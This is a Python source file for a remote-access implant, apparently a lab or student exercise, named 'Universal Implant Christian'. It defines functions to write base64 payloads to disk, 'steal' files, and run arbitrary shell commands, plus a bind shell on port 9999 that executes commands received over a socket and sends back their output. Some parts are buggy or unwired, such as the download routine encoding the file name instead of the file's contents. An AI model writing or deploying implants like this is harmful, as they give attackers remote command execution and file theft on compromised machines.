import base64
import sys 
import os
import subprocess
import socket

'''Universal Implant Christian'''

#upload
def upload_file(b64_in: str, dest_file: str) -> None:
    b64DecodeUp = base64.b64decode(b64_in)
    with open(dest_file, "wb") as f:
        f.write(b64DecodeUp)
    return

#download
def download_file(fileToDL: str) -> bytes:
     b64EncDL = base64.b64encode(fileToDL.encode('utf-8'))
     with open(fileToDL, "rb") as f:
         DLFile = f.read()  
     print('stole ' + fileToDL)
     print(b64EncDL.decode('utf-8'))
     return b64EncDL

#execute
def execute(command: str) -> bytes:
    print(command)
    with subprocess.Popen(["sh", "-c", command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as proc: 
        exe_command = proc.stdout.read().strip()
    return bytes(exe_command)

#bind shell
def bindShell() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 9999))
        s.listen(1)
        while True:
            conn, addr = s.accept()
            with conn:
               client = addr[0]
               c_port = addr[1]
               print(f"Connection from '{client}:{c_port}'")
               while True:
                data = conn.recv(4096)
                if not data:
                    conn.close()
                    break

                #receive data to split 
                raw_command = data.decode("utf-8")
                command = raw_command.strip()
                args = command.split("::", 4)
                #variables
                execute_param = "execute"
                download_cmd = "download"
                upload_cmd = "upload"
                #recv execute
                if args[0] == execute_param:
                    exec_command = args[1]
                    test = (
                        ('Executed '+exec_command+':\n'+'-'*20+'output'+'-'*20+'\n').encode('utf-8')+
                    execute(exec_command)+
                    ('\n'+'-'*20+'output'+'-'*20+'\n\n').encode('utf-8')
                    )
                    conn.sendall(test)


                
		
#main
def main():
    dest_file_out = "./test.txt"
    fileUp = "./canitruncrysis.sh"
    b64_test = "IyEvYmluL2Jhc2gKZWNobyBoZWxsbwo="
    cmd = 'ifconfig'
    bindShell()
    return
if __name__ == '__main__':
        main()
